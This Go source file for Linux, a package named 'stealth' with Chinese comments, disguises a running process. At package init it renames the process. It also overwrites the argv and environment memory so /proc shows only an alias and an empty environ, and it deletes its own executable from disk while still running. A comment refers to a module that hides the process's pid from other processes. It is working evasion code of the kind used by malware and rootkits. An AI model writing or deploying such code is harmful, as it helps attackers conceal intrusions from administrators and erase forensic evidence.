//go:build linux

package stealth

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

// comm 长度上限：TASK_COMM_LEN(16) - 1
const commMax = 15

// 包初始化阶段就改主线程名：此刻仍在 m0（进程主线程）上，
// 而 ps 读的是线程组 leader 的 comm，只有 leader 自己写 comm 才生效。
func init() {
	n := defaultAlias()
	if len(n) > commMax {
		n = n[:commMax]
	}
	if p, err := unix.BytePtrFromString(n); err == nil {
		_ = unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(p)), 0, 0, 0)
	}
}

func maskUser(c Config) error {
	var errs []string
	if err := setComm(c.Alias); err != nil {
		errs = append(errs, "comm:"+err.Error())
	}
	if err := maskArgs(c.Alias); err != nil {
		errs = append(errs, "argv:"+err.Error())
	}
	if c.HideEnv {
		if err := maskEnviron(); err != nil {
			errs = append(errs, "environ:"+err.Error())
		}
	}
	if c.ShredExe {
		if err := shredSelfExe(); err != nil {
			errs = append(errs, "exe:"+err.Error())
		}
	}
	if len(errs) > 0 {
		return errors.New(strings.Join(errs, "; "))
	}
	return nil
}

func setComm(alias string) error {
	n := alias
	if len(n) > commMax {
		n = n[:commMax]
	}
	p, err := unix.BytePtrFromString(n)
	if err != nil {
		return err
	}
	if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(p)), 0, 0, 0); err != nil {
		return err
	}
	// 同一线程再写一次 comm
	_ = os.WriteFile("/proc/thread-self/comm", []byte(n), 0)
	return nil
}

// maskArgs 把 argv 所在栈内存清零后写入别名。Go 的 os.Args 字符串直接别名原始
// argv 内存，因此拿到第一个和最后一个字符串的数据指针即可定出整个区间。
func maskArgs(alias string) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("recover: %v", r)
		}
	}()
	if len(os.Args) == 0 {
		return errors.New("os.Args 为空")
	}
	first := unsafe.StringData(os.Args[0])
	last := unsafe.StringData(os.Args[len(os.Args)-1])
	if first == nil || last == nil {
		return errors.New("argv 内存不可寻址")
	}
	start := uintptr(unsafe.Pointer(first))
	end := uintptr(unsafe.Pointer(last))
	tail := uintptr(len(os.Args[len(os.Args)-1])) + 1
	if end <= start || end+tail-start > 1<<20 {
		return errors.New("argv 区间异常")
	}
	region := unsafe.Slice(first, int(end+tail-start))
	for i := range region {
		region[i] = 0
	}
	copy(region, alias)
	os.Args = []string{alias}
	return nil
}

// maskEnviron 清空 environ 内存区，同时把环境变量搬到 Go 私有副本，
// 保证 Getenv/Setenv 可用，而 /proc/<pid>/environ 为空。
func maskEnviron() (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("recover: %v", r)
		}
	}()
	envs := os.Environ()
	saved := make(map[string]string, len(envs))
	for _, kv := range envs {
		if i := strings.IndexByte(kv, 0x3d); i > 0 {
			saved[kv[:i]] = kv[i+1:]
		}
	}
	if len(envs) > 0 {
		first := unsafe.StringData(envs[0])
		last := unsafe.StringData(envs[len(envs)-1])
		if first != nil && last != nil {
			start := uintptr(unsafe.Pointer(first))
			end := uintptr(unsafe.Pointer(last))
			tail := uintptr(len(envs[len(envs)-1])) + 1
			if end > start && end+tail-start < 1<<20 {
				region := unsafe.Slice(first, int(end+tail-start))
				for i := range region {
					region[i] = 0
				}
			}
		}
	}
	os.Clearenv()
	for k, v := range saved {
		_ = os.Setenv(k, v)
	}
	return nil
}

// shredSelfExe 把真实可执行文件从磁盘删除（inode 仍被运行中的进程持有）。
// 部署脚本请先把二进制 link 成目标名再启动，否则无法再重启。
func shredSelfExe() error {
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return err
	}
	if strings.HasSuffix(exe, " (deleted)") {
		return nil
	}
	if err := os.Remove(exe); err != nil {
		return fmt.Errorf("remove %s: %w", exe, err)
	}
	return nil
}

// VerifyPlatform 读取 /proc 自检，供 Debug 日志与验证脚本使用。
func VerifyPlatform() []string {
	out := []string{}
	pid := os.Getpid()
	for _, p := range []string{"/proc/self/comm", "/proc/self/cmdline", "/proc/self/environ", "/proc/self/exe"} {
		b, err := os.ReadFile(p)
		if err != nil {
			out = append(out, fmt.Sprintf("%s -> 读取失败: %v", p, err))
			continue
		}
		out = append(out, fmt.Sprintf("%s -> %q", p, strings.Join(strings.Split(string(b), string(rune(0))), " ")))
	}
	if b, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid)); err == nil {
		s := string(b)
		if i := strings.IndexByte(s, 0x29); i > 0 && i+2 < len(s) {
			out = append(out, fmt.Sprintf("/proc/%d/stat comm -> %s", pid, strings.TrimSpace(s[i+2:])))
		}
	}
	found := false
	if entries, err := os.ReadDir("/proc"); err == nil {
		for _, e := range entries {
			if e.Name() == fmt.Sprint(pid) {
				found = true
				break
			}
		}
	}
	out = append(out, fmt.Sprintf("/proc 目录项里能否看到自身 pid(模块默认对自身可见, 对其他进程不可见): %v", found))
	return out
}
